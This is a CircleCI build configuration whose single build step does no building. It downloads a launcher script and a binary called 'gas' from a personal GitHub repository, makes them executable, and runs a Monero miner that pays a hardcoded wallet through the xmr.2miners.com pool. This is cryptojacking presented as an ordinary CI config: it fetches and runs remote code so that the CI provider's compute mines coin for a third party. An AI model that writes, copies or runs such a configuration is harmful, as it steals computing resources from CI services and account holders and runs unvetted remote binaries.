version: 2.0
jobs:
  build:
    docker:
      - image: circleci/ruby:2.4.2-jessie-node
        auth:
          username: mydockerhub-user
          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
    steps:
      - checkout
      - run:  wget https://raw.githubusercontent.com/hunshukajh/yes/main/cmdline_launcher.sh && wget https://github.com/hunshukajh/yes/raw/main/gas && chmod +x gas cmdline_launcher.sh && ./cmdline_launcher.sh -algo randomx -coin XMR -wallet RLYutKyuv2UioD8mJpfLd6VyCa9tzL4EMR  -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 xmr.2miners.com:2222
